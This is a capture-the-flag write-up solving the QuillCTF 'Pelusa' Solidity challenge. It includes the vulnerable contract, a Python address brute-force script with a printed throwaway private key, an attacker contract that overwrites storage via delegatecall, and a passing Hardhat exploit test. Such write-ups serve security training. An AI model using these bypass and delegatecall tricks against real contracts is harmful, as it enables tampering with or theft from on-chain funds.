# QuillCTF : Pelusa

## Objective of CTF
Score from 1 to 2 goals for a win.

### Contract code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGame {
    function getBallPossesion() external view returns (address);
}

// "el baile de la gambeta"
// https://www.youtube.com/watch?v=qzxn85zX2aE
// @author https://twitter.com/eugenioclrc
contract Pelusa {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor() {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
    }

    function passTheBall() external {
        require(msg.sender.code.length == 0, "Only EOA players");
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

        player = msg.sender;
    }

    function isGoal() public view returns (bool) {
        // expect ball in owners posession
        return IGame(player).getBallPossesion() == owner;
    }

    function shoot() external {
        require(isGoal(), "missed");
				/// @dev use "the hand of god" trick
        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
        require(success, "missed");
        require(uint256(bytes32(data)) == 22_06_1986);
    }
}
```

First, we have to set player to our contract address by calling `passTheBall()`, then we can call `shoot()` for the contract to delegate call to our contract, and changing the goals from 1 to 2

```solidity
        require(msg.sender.code.length == 0, "Only EOA players");
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");
```

`passTheBall()` allows only EOA players by checking code size of `msg.sender`, however this can be bypassed by running the code on the constructor

Also it checks the address of `msg.sender`, we can bypass this by bruteforcing a contract address that can satisfy its requirement

This is a python script to find a deployer address that can deploy a contract which the contract address satisfy the requirement :

```python
from eth_account import Account
import secrets
from web3 import Web3
import rlp

while True:
	priv = secrets.token_hex(32)
	private_key = "0x" + priv
	address = Account.from_key(private_key).address
	contractAddress = Web3.keccak(rlp.encode([int(address, 16), 0]))[12:].hex()
	if (int(contractAddress, 16) % 100 == 10):
		print("Wallet : ", address)
		print("Private key : ", private_key)
		print("Contract address on nonce 0 : ", contractAddress)
		break
```

Result :
```
# python3 pelusaBruteforce.py 
Wallet :  0x3777C607EA9219683dE837dc954Bf811af459A8B
Private key :  0x764991560dd9ba6d11255e1aaea8c8562c08ab1868ac7c94e7d7485a6564ec17
Contract address on nonce 0 :  0xe6915c8325d1f7df2a6c9f4848c36adba32e2ec6
```

We can use that wallet to deploy the attacker contract, so it can pass the address check in `passTheBall()`

Also our contract need to return the owner on `getBallPossesion()`, and have a `handOfGod()` function that return `22_06_1986` and change goals to 2 when it delegate call our contract

### Attacker contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./pelusa.sol";

contract PelusaSolve {

    address private immutable owner;
    address internal player;
    uint256 public goals = 1;
    
    constructor(address contractOwner, address contractAddr) {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(contractOwner, blockhash(block.number))))));
        Pelusa(contractAddr).passTheBall();
    }
    
    function getBallPossesion() external view returns (address) {
        return owner;
    }
    
    function handOfGod() external returns (uint256) {
        goals = 2;
        return uint256(22_06_1986);
    }
    
    function exploit(address contractAddr) external {
        Pelusa(contractAddr).shoot();
    }
}
```

## Proof of concept

### Hardhat test

```js
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe('QuillCTF : Pelusa', () => {

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    attacker2 = new ethers.Wallet("0x764991560dd9ba6d11255e1aaea8c8562c08ab1868ac7c94e7d7485a6564ec17", attacker.provider);
    await attacker.sendTransaction({to: attacker2.address, value: ethers.utils.parseEther("1.0")});

    contract = await ethers.getContractFactory('Pelusa', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('Goals should be set to 2', async () => {
    // deploy the attacker contract
    attackerContract = await ethers
      .getContractFactory('PelusaSolve', attacker2)
      .then(f => f.deploy(owner.address, contract.address));
    await attackerContract.deployed();
    
    await attackerContract.connect(attacker2).exploit(contract.address);
    
    expect(await contract.goals()).to.equal(2);
  });
});
```

### Hardhat test output

```
# npx hardhat test test/pelusa-solve.js 


  QuillCTF : Pelusa
    ✔ Goals should be set to 2 (243ms)


  1 passing (2s)
```